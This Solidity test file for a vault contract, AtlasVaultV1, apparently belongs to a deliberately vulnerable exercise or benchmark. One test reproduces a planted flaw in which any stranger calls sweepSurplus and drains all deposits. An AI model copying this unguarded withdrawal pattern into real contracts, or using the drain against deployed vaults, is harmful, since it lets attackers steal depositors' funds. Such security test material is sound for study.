// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {TestBase} from "./TestBase.sol";
import {AtlasVaultV1} from "../src/AtlasVaultV1.sol";

contract AtlasVaultV1Test is TestBase {
    AtlasVaultV1 vault;

    function setUp() public {
        vault = new AtlasVaultV1();
    }

    function testDepositAndWithdraw() public {
        vm.deal(address(this), 2 ether);
        vault.deposit{value: 2 ether}();
        vault.withdraw(1 ether);
        require(vault.deposits(address(this)) == 1 ether, "user accounting");
        require(vault.totalDeposits() == 1 ether, "total accounting");
        require(address(vault).balance == 1 ether, "solvency");
    }

    function testIntentionalFlawStrangerCanDrainDeposits() public {
        vm.deal(address(this), 2 ether);
        vault.deposit{value: 2 ether}();
        address attacker = address(0xBEEF);
        vm.prank(attacker);
        vault.sweepSurplus(payable(attacker), 2 ether);
        require(attacker.balance == 2 ether, "drain reproduced");
        require(address(vault).balance < vault.totalDeposits(), "solvency violated");
    }
}
